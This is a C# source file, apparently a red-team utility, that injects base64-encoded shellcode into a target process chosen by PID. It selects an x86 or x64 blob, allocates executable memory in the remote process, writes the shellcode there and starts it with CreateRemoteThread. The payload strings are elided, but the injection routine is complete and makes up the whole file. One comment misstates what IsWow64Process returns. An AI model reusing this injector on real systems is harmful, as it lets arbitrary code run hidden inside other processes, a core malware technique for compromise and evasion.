/*  Author: TheWover
    Description: Injects embedded base64-encoded shellcode into an arbitrary hardcoded process using native Windows 32 API calls.
    Last Modified: 11/1/2018
 */
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShellcodeTest
{
    public class Program
    {
        static string x64 = @"6HB...AA=";
        static string x86 = @"6HB...AAA";

        static int pid = Process.GetCurrentProcess().Id;

        static void Main(string[] args)
        {
            if (args.Length >= 1)
                pid = Convert.ToInt32(args[0]);

            Inject(x86, x64, pid);
        }

        [DllImport("kernel32.dll")]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
            uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess,
            IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        const int PROCESS_CREATE_THREAD = 0x0002;
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int PROCESS_VM_OPERATION = 0x0008;
        const int PROCESS_VM_WRITE = 0x0020;
        const int PROCESS_VM_READ = 0x0010;


        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_READWRITE = 4;
        const uint PAGE_EXECUTE_READWRITE = 0x40;

        /// <summary>
        /// Injects shellcode into the target process using CreateRemoteThread, using the correct version for the process's architecture.
        /// </summary>
        /// <param name="x86">Base64-encoded x86 shellcode.</param>
        /// <param name="x64">Base64-encoded x64 shellcode</param>
        /// <param name="procPID">The PID of the target process.</param>
        /// <returns></returns>
        public static int Inject(string x86, string x64, int procPID)
        {

            Process targetProcess = Process.GetProcessById(procPID);
            Console.WriteLine(targetProcess.Id);

            string s;
            
            if (IsWow64Process(targetProcess) == true)
                s = x86;
            else
                s = x64;

            byte[] shellcode = Convert.FromBase64String(s);

            IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, targetProcess.Id);

            IntPtr allocMemAddress = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)shellcode.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            UIntPtr bytesWritten;
            WriteProcessMemory(procHandle, allocMemAddress, shellcode, (uint)shellcode.Length, out bytesWritten);

            CreateRemoteThread(procHandle, IntPtr.Zero, 0, allocMemAddress, IntPtr.Zero, 0, IntPtr.Zero);

            return 0;
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        public static extern bool IsWow64Process(System.IntPtr hProcess, out bool lpSystemInfo);

        /// <summary>
        /// Checks whether the process is 64-bit.
        /// </summary>
        /// <returns>Returns true if process is 64-bit, and false if process is 32-bit.</returns>
        public static bool IsWow64Process(Process process)
        {
            bool retVal = false;
            IsWow64Process(process.Handle, out retVal);
            return retVal;
        }
    }
}